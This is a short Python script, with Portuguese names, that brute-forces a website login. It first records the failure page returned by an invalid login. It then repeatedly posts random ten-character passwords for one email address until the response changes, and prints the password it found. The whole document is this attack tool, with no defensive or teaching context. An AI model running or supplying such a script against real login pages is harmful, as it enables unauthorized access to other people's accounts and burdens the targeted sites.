import requests
import random
import string

url = 'Site.com'

dataInvalida = {
    'email': 'dasdsasd',
    'password': 'dsadasdsda'
}

response = requests.post(url, data=dataInvalida)

page_invalida =  response.text


while response.text == page_invalida:
    def gerar_string_aleatoria(tamanho):
        caracteres = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(caracteres) for _ in range(tamanho))

    tamanho_da_string = 10
    string_aleatoria = gerar_string_aleatoria(tamanho_da_string)

    data = {
    'email': 'email',
    'password': string_aleatoria
    }
    response = requests.post(url, data=data)
    if response.text != page_invalida:

        print("Senha encontrada " + string_aleatoria)
        break

    else:
        print("Falha no login")









